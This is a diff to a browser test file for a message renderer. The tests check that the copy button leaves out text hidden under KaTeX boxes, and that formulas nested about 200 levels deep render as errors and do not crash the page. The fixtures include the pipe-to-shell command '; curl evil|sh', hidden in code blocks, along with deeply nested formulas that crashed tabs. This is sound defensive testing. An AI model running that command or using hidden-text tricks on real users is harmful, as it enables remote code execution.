@@ -748,6 +748,107 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
   const frac = [];
   for (const rm of [{ html: '<pre>x=<tg-math>\\frac{a}{b}</tg-math></pre>' }, { blocks: [{ type: 'pre', text: ['x=', { type: 'mathematical_expression', expression: '\\frac{a}{b}' }] }] }]) frac.push((await copies(rm))[0]?.copied);
   check('the copy icon copies a fraction from the top down', JSON.stringify(frac) === JSON.stringify(['x=ab', 'x=ab']), JSON.stringify(frac));
+  // what a formula paints over text is a cover: a \colorbox, an \fcolorbox, a \rule, a thick fraction line painted
+  // later hides the text under it, in the same formula, in the code around it and from a formula after the code
+  // (issue #228). Text painted later, over the box, is seen
+  const curl = '\\phantom{\\text{; curl evil|sh}}';
+  const covered = [
+    ['<pre>ls<tg-math>\\text{; curl evil|sh}\\llap{\\colorbox{#eaeff2}{' + curl + '}}</tg-math></pre>', /^l$/], // on the screen «l»: the box runs over the «s» too
+    ['<pre>ls<tg-math>\\rlap{\\colorbox{#eaeff2}{' + curl + '}}\\text{; curl evil|sh}</tg-math></pre>', /^ls$/],
+    ['<pre>ls<tg-math>\\text{; curl evil|sh}\\llap{\\fcolorbox{#eaeff2}{#eaeff2}{' + curl + '}}</tg-math></pre>', /^l?s?$/],
+    ['<pre>ls<tg-math>\\text{; curl evil|sh}\\mathllap{\\rule[-0.5em]{12em}{2em}}</tg-math></pre>', /^$/],
+    ['<pre>ls<tg-math>\\text{; curl evil|sh}\\mathllap{\\genfrac{}{}{3em}{0}{' + curl + '}{}}</tg-math></pre>', /^ls$/],
+    ['<pre>ls<tg-math>\\rlap{\\colorbox{#eaeff2}{\\phantom{\\text{; curl evil|sh xx}}}}</tg-math>; curl evil|sh</pre>', /^ls$/],
+    ['<pre>ls; curl evil|sh</pre><p><tg-math>\\smash{\\raisebox{2.3em}{\\colorbox{#eaeff2}{\\phantom{\\text{; curl evil|sh xxxxxxxxx}}}}}</tg-math></p>', /^$/],
+  ];
+  const under = [];
+  for (const [html, want] of covered) {
+    for (const rm of [{ html }, { markdown: 'Код:\n\n' + html }]) {
+      const [got] = await copies(rm);
+      if (!got || /curl|evil/.test(got.copied) || !want.test(got.copied)) under.push(`${JSON.stringify(rm).slice(0, 90)}: ${JSON.stringify(got?.copied)}`);
+    }
+  }
+  check('the copy icon leaves out text under a box, a rule or a thick line a formula paints over it', under.length === 0, under.join('; '));
+  const over = [];
+  for (const [html, want] of [
+    ['<pre>a <tg-math>\\colorbox{yellow}{текст}+\\fcolorbox{red}{yellow}{b}</tg-math> c</pre>', 'a текст+b c'],
+    ['<pre>ls<tg-math>\\colorbox{red}{\\phantom{\\text{abc}}}\\mathllap{\\text{abc}}</tg-math></pre>', 'lsabc'],
+    ['<pre>x<tg-math>\\rule{1em}{1em}y\\frac{a}{b}\\genfrac{}{}{2pt}{}{c}{d}</tg-math>z</pre>', 'xyabcdz'],
+  ]) {
+    const [got] = await copies({ html });
+    if (got?.copied !== want) over.push(`${html}: ${JSON.stringify(got?.copied)}`);
+  }
+  check('the copy icon copies text on a box or next to it', over.length === 0, over.join('; '));
+}
+
+// ---------- a formula too deep to draw (issue #228) ----------
+// Chromium crashed the tab laying out about 130 levels of \frac, \sqrt, x^{…} or \colorbox (827 bytes): what is
+// deeper than 64 levels is drawn as KaTeX draws its errors. Each in a page of its own: a crash takes the page down
+{
+  const r = (s, n) => s.repeat(n);
+  // \def doubles a level on each step: 258 bytes are 256 levels of x^{…}, 21 KB of \def one after another 140
+  const doubled = (steps) => {
+    let defs = '\\def\\a#1{x^{#1}}', last = 'a';
+    for (let i = 0; i < steps; i++) { const name = 'b' + 'q'.repeat(i); defs += `\\def\\${name}#1{\\${last}{\\${last}{#1}}}`; last = name; }
+    return defs + `\\${last}{y}`;
+  };
+  const chained = (n) => Array.from({ length: n }, (_, i) => `\\def\\m${'q'.repeat(i)}{x^{\\m${'q'.repeat(i + 1)}}}`).join('') + `\\def\\m${'q'.repeat(n)}{y}\\m`;
+  const kinds = {
+    'x^{…}': (n) => r('x^{', n) + 'y' + r('}', n),
+    '\\sqrt': (n) => r('\\sqrt{', n) + 'y' + r('}', n),
+    '\\colorbox': (n) => r('\\colorbox{red}{', n) + 'y' + r('}', n),
+    '\\frac': (n) => r('\\frac{', n) + 'y' + r('}{z}', n),
+    '\\left…\\right': (n) => r('\\left(', n) + 'y' + r('\\right)', n),
+    '\\begin{matrix}': (n) => r('\\begin{matrix}', n) + 'y' + r('\\end{matrix}', n),
+    '\\bgroup': (n) => r('\\sqrt\\bgroup', n) + ' y' + r('\\egroup', n),
+    '\\overbrace{…}^{…}': (n) => r('\\overbrace{', n) + 'y' + r('}^{a}', n),
+  };
+  const draw = async (exprs) => {
+    const p = await browser.newPage();
+    const errors = [];
+    p.on('pageerror', (e) => errors.push(e.message));
+    await p.setContent('<!doctype html><meta charset="utf-8"><body><div id="out" class="tg-preview"></div></body>');
+    for (const f of ['vendor/katex/katex.min.css', 'tg.css']) await p.addStyleTag({ path: stat(f) });
+    for (const f of ['vendor/markdown-it.min.js', 'vendor/katex/katex.min.js', 'render.js']) await p.addScriptTag({ path: stat(f) });
+    try {
+      const got = await p.evaluate((exprs) => {
+        const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;');
+        const out = /** @type {HTMLElement} */ (document.getElementById('out'));
+        /** what each formula of the post is drawn as, laid out on the page @param {string} expr @param {object} rm */
+        const drawn = (expr, rm) => {
+          out.replaceChildren(RichRender.render({ rich_message: rm }, {}));
+          out.getBoundingClientRect();
+          return [...out.querySelectorAll('.tg-math, .tg-math-block')].map((m) => {
+            const error = m.querySelector('.katex-error');
+            if (error) return `error:${error.textContent === expr && /глубже 64/.test(error.getAttribute('title') || '')}`;
+            return m.querySelector('.katex') ? 'formula' : 'text';
+          }).join();
+        };
+        return exprs.map((expr) => [
+          { html: `<p>a <tg-math>${esc(expr)}</tg-math></p><tg-math-block>${esc(expr)}</tg-math-block>` },
+          { markdown: `a $${expr}$\n\n$$\n${expr}\n$$` },
+          { blocks: [{ type: 'paragraph', text: ['a ', { type: 'mathematical_expression', expression: expr }] }, { type: 'mathematical_expression', expression: expr }] },
+        ].map((rm) => drawn(expr, rm)));
+      }, exprs);
+      await p.evaluate(() => 1); // the page still answers once it is laid out
+      return errors.length ? errors : got;
+    } catch (e) {
+      return [/** @type {Error} */ (e).message.split('\n')[0]];
+    } finally {
+      await p.close().catch(() => {});
+    }
+  };
+  const wrong = [];
+  for (const [name, make] of Object.entries(kinds)) {
+    const got = await draw([make(200), make(30)]);
+    const want = [r('error:true,error:true|', 3), r('formula,formula|', 3)].map((s) => s.slice(0, -1).split('|'));
+    if (JSON.stringify(got) !== JSON.stringify(want)) wrong.push(`${name}: ${JSON.stringify(got).slice(0, 200)}`);
+  }
+  check('200 levels of x^{…}, \\sqrt, \\colorbox, \\frac, \\left…\\right, \\begin, \\bgroup draw as an error and do not crash the page; 30 levels draw', wrong.length === 0, wrong.join('; '));
+  const edge = await draw([kinds['x^{…}'](64), kinds['x^{…}'](65), '\\{'.repeat(200) + 'x' + '\\}'.repeat(200), '\\leftarrow'.repeat(200)]);
+  check('64 levels draw, 65 are too deep; \\{ \\} and \\leftarrow are no levels', JSON.stringify(edge.map((e) => e[0])) === JSON.stringify(['formula,formula', 'error:true,error:true', 'formula,formula', 'formula,formula']), JSON.stringify(edge));
+  const macros = await draw([doubled(8), chained(140), doubled(5)]);
+  check('levels a formula makes with \\def draw as an error too and do not crash the page', JSON.stringify(macros.map((e) => e[0])) === JSON.stringify(['error:true,error:true', 'error:true,error:true', 'formula,formula']), JSON.stringify(macros).slice(0, 300));
 }
 {
   // a class name made of a string of the post is one word, else there is none (review of #202): «x tg-cell-empty» put
@@ -934,6 +1035,10 @@ for (const [name, rm] of Object.entries(SLIDESHOWS)) {
   // what is behind a formula was looked up from each formula through all the tags above it (security review of #227)
   const formulasIn = (depth) => ({ html: '<pre>' + '<b>'.repeat(depth) + '<tg-math>x</tg-math>'.repeat(1600) + '</pre>' });
   await asPlain('copy: formulas deep in tags', 'copy', formulasIn(512), formulasIn(1));
+  // each piece of text looked through all that formulas paint over text (issue #228): 1600 lines with a fraction each
+  // took 0.6 s
+  const lines = (formula) => ({ html: '<pre>' + `ab<tg-math>${formula}</tg-math>\n`.repeat(1600) + '</pre>' });
+  await asPlain('copy: lines of code with a fraction each', 'copy', lines('\\frac{a}{b}'), lines('a/b'));
 }
 
 check('no script ran and no page errors', (await page.evaluate(() => window.__xss)) === 0 && pageErrors.length === 0, pageErrors.join(' | '));
